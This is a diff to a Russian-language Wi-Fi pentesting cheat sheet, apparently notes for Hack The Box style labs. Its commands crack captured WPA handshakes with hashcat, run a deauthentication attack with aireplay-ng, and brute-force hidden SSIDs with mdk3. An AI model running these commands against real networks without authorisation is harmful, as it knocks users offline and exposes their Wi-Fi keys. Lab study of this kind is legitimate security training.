@@ -1,8 +1,8 @@
 # WIFI
 
 # Сколько режимов программного интерфейса доступно?
-iw list 
-ищем 'software interface modes'
+    iw list 
+    ищем 'software interface modes'
 
 # Сканирование доступных сетей
     iwlist wlan0 scan |  grep 'Cell\|Quality\|ESSID\|IEEE'
@@ -53,3 +53,26 @@ iw dev
     hcxpcapngtool -o hash.hc22000 test-01.cap
 
     hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
+
+# Поиск скрытых SSID
+
+    sudo airmon-ng start wlan0
+    sudo airodump-ng -c 1 wlan0mon
+
+    # Обнаружение скрытых SSID с помощью Deauth
+    sudo airodump-ng -c 1 wlan0mon
+    sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon
+
+    # Подбор скрытого SSID методом перебора 
+    sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4
+    -p заглавная буква (u)    цифры (n)    все напечатанные (а)    строчные и прописные буквы (c)    строчные и прописные буквы плюс цифры (м) 
+
+    Перебор с использованием списка слов
+    sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5
+
+# Сохранение результата в файл 
+    sudo airodump-ng wlan0mon -w HTB
+
+# График взаимосвязей между клиентами и точкой доступа
+    sudo airgraph-ng -i HTB-01.csv -g CAPR -o HTB_CAPR.png
+    
